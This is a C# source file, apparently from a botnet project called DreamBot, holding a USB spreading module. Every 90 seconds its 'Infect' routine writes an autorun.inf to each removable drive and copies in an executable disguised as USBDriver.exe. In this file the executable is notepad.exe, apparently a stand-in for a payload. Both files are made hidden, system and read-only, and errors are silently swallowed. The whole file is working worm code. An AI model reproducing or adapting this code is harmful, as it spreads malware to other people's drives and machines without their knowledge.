using System;
using System.IO;
using DreamBot.Workers;

namespace DreamBot.Spread
{
    class Usb
    {
        public Usb()
        {
            
        }
        public Usb(IWorkScheduler worker)
        {
            worker.QueueForever(Infect, TimeSpan.FromSeconds(90));
        }

        private void Infect()
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (!drive.IsReady || drive.DriveType != DriveType.Removable) continue;

                try
                {
                    var autorun = drive.Name + "autorun.inf";
                    var binary  = drive.Name + "USBDriver.exe";

                    if (File.Exists(autorun)) File.Delete(autorun);
                    if (File.Exists(binary))  File.Delete(binary);

                    using (var writer = new StreamWriter(new FileStream(autorun, FileMode.Create, FileAccess.Write)))
                    {
                        writer.WriteLine("[AutoRun]");
                        writer.WriteLine("action=USBDriver.exe");
                    }

                    File.Copy(@"c:\windows\system32\notepad.exe", binary, true);
                    const FileAttributes attributes = FileAttributes.System | FileAttributes.Hidden | FileAttributes.ReadOnly;
                    File.SetAttributes(autorun, attributes);
                    File.SetAttributes(binary,  attributes);
                }
                catch { }
            }
        }
    }
}
